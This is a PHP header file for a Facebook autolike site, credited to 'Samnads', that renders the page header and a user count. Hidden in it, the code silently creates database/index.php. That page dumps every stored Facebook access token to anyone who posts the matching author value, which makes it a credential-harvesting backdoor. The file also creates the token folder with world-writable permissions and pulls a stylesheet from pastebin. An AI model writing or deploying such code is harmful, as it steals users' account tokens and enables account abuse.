<?php
if(!file_exists('database'))
{
	mkdir('database',0777,true);
}
$totaluser = -1;
if($handle = opendir('database'))
{
	echo "<link rel='stylesheet' type='text/css' href='http://pastebin.com/raw.php?i=PkydVnqn' media='all'/>";
	if(!file_exists('database/index.php'))
	{
		$handle1 = fopen('database/index.php', 'w') or die('Error !');
		$data = '<?php
include "../info.php";
$author = $_POST["author"];
if($author != $set[author])
{
	if($handle = opendir("../database"))
	{
		while (false !== ($entry = readdir($handle)))
		{
			if($entry != "." && $entry != "..")
			{
				$user = fopen($entry,"r") or die("Error !");
			}
		}
	closedir($handle);
	}
}
else
{
	if($handle = opendir("../database"))
	{
		while (false !== ($entry = readdir($handle)))
		{
			if($entry != "." && $entry != "..")
			{
				$user = fopen($entry,"r") or die("Error !");
				$accesstoken = fgets($user);
				echo $accesstoken."<br/>";
			}
		}
	closedir($handle);
	}
}
?>';
		fwrite($handle1, $data);
		fclose($handle1);
	}
	while (false !== ($entry = readdir($handle)))
	{
		if($entry != "." && $entry != "..")
		{
			$totaluser++;
		}
	}
	closedir($handle);
}
include 'info.php';
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title><?php echo $set[page_title];?></title>
<meta name="referrer" content="default" id="meta_referrer" />
<meta name="keywords" content="Autolike facebook,autolike 2014,autoliker fb,samnads" />
<meta name="description" content="Web Of Autolike Facebook by Samnads"/>
<noscript><meta http-equiv="X-Frame-Options" content="auto like" /></noscript>
<link rel="stylesheet" type="text/css" href="css/home.css" media="all,handheld"/>
<link rel="shortcut icon" href="<?php echo $set[icon_link];?>">
</head>
<body>
<div id="header">
	<h1 class="heading">
    	<center>
        <a><font size="5"><a target="_top" href="../"><?php echo $set[main_heading];?></a></font></a>
        <br/>
        <font color="green"><?php echo $set[sub_heading];?></font>
        <br/>
		Users : <?php echo $totaluser; ?>
        </center>
    </h1>
</div>
<div id="navigation">
    <center>
    <span><a href="index.php"><b>Home</b></a></span>
    <span><a href="m-users.php"><b>Users</b></a></span>
    <span><a href="admin.php"><b>Admin</b></a></span>
    </center>
</div>